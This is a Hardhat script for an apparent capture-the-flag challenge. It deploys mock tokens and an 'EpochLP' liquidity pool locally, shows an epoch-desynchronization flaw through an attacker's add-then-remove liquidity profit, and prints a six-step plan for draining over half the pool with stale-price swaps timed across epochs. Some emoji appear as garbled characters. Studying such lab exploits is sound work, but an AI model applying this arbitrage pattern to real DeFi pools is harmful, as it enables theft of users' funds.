import { ethers } from "hardhat";

/**
 * EpochLP Exploit Script
 * 
 * This script demonstrates the epoch desynchronization vulnerability.
 * The actual CTF challenge requires participants to discover and implement
 * the full exploit strategy.
 */

async function main() {
  console.log("â•".repeat(60));
  console.log("      ðŸŽ¯ EpochLP Exploit Demonstration");
  console.log("â•".repeat(60));

  const [owner, attacker] = await ethers.getSigners();
  
  console.log("\n[SETUP] Deploying contracts...");
  
  // Deploy tokens
  const MockERC20 = await ethers.getContractFactory("MockERC20");
  const tokenA = await MockERC20.deploy("Alpha Token", "ALPHA", ethers.parseEther("1000000"));
  const tokenB = await MockERC20.deploy("Beta Token", "BETA", ethers.parseEther("1000000"));
  
  // Deploy pool
  const EpochLP = await ethers.getContractFactory("EpochLP");
  const pool = await EpochLP.deploy(await tokenA.getAddress(), await tokenB.getAddress(), "EpochLP", "ELP");
  
  // Add initial liquidity
  const liquidityAmount = ethers.parseEther("100000");
  await tokenA.approve(await pool.getAddress(), liquidityAmount);
  await tokenB.approve(await pool.getAddress(), liquidityAmount);
  await pool.addLiquidity(liquidityAmount, liquidityAmount);
  
  // Give attacker tokens
  await tokenA.transfer(attacker.address, ethers.parseEther("10000"));
  await tokenB.transfer(attacker.address, ethers.parseEther("10000"));
  
  console.log("âœ… Contracts deployed and funded");
  
  // Demonstrate the vulnerability
  console.log("\n[DEMONSTRATION] Epoch Desynchronization:");
  
  const currentEpoch = await pool.currentEpoch();
  const [currentReserveA, currentReserveB] = await pool.getCurrentReserves();
  const [pricingReserveA, pricingReserveB] = await pool.getPricingReserves();
  
  console.log("Current epoch:", currentEpoch.toString());
  console.log("Current reserves:", ethers.formatEther(currentReserveA), ethers.formatEther(currentReserveB));
  console.log("Pricing reserves:", ethers.formatEther(pricingReserveA), ethers.formatEther(pricingReserveB));
  
  // Show the arbitrage opportunity
  console.log("\n[EXPLOIT] Demonstrating arbitrage opportunity:");
  
  const attackerPool = pool.connect(attacker);
  
  // Approve tokens
  await tokenA.connect(attacker).approve(await pool.getAddress(), ethers.parseEther("1000"));
  await tokenB.connect(attacker).approve(await pool.getAddress(), ethers.parseEther("1000"));
  
  // Get initial balances
  const initialBalanceA = await tokenA.balanceOf(attacker.address);
  const initialBalanceB = await tokenB.balanceOf(attacker.address);
  
  console.log("Initial attacker balances:");
  console.log("  ALPHA:", ethers.formatEther(initialBalanceA));
  console.log("  BETA:", ethers.formatEther(initialBalanceB));
  
  // Step 1: Add liquidity (uses current epoch valuation)
  console.log("\n[STEP 1] Adding liquidity (uses epoch e valuation)...");
  await attackerPool.addLiquidity(ethers.parseEther("100"), ethers.parseEther("100"));
  
  const lpBalance = await pool.balanceOf(attacker.address);
  console.log("LP tokens received:", ethers.formatEther(lpBalance));
  
  // Step 2: Remove liquidity (uses next epoch valuation)
  console.log("\n[STEP 2] Removing liquidity (uses epoch e+1 valuation)...");
  await attackerPool.removeLiquidity(lpBalance);
  
  // Check final balances
  const finalBalanceA = await tokenA.balanceOf(attacker.address);
  const finalBalanceB = await tokenB.balanceOf(attacker.address);
  
  console.log("Final attacker balances:");
  console.log("  ALPHA:", ethers.formatEther(finalBalanceA));
  console.log("  BETA:", ethers.formatEther(finalBalanceB));
  
  // Calculate profit
  const profitA = finalBalanceA - initialBalanceA;
  const profitB = finalBalanceB - initialBalanceB;
  
  console.log("\n[RESULT] Profit from basic epoch arbitrage:");
  console.log("  ALPHA profit:", ethers.formatEther(profitA));
  console.log("  BETA profit:", ethers.formatEther(profitB));
  
  // Explain the full exploit
  console.log("\n" + "â•".repeat(60));
  console.log("              ðŸ”¥ FULL EXPLOIT STRATEGY");
  console.log("â•".repeat(60));
  console.log("\nThe complete exploit requires:");
  console.log("1. â° Wait for epoch transition");
  console.log("2. ðŸ”„ Swap using stale pricing (epoch e-1)");
  console.log("3. ðŸ’° Add liquidity using current reserves (epoch e)");
  console.log("4. ðŸ”€ Reverse swap using still-stale pricing");
  console.log("5. ðŸ’¸ Remove liquidity using future valuation (epoch e+1)");
  console.log("6. ðŸŽ¯ Repeat across multiple epochs for maximum profit");
  
  console.log("\nðŸ’¡ CTF Challenge:");
  console.log("- Implement the full timed exploit");
  console.log("- Extract >50% of pool value");
  console.log("- Leave pool functional for others");
  console.log("- Complete within limited transactions");
  
  console.log("\n" + "â•".repeat(60));
  console.log("               âœ… Demo Complete!");
  console.log("â•".repeat(60));
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
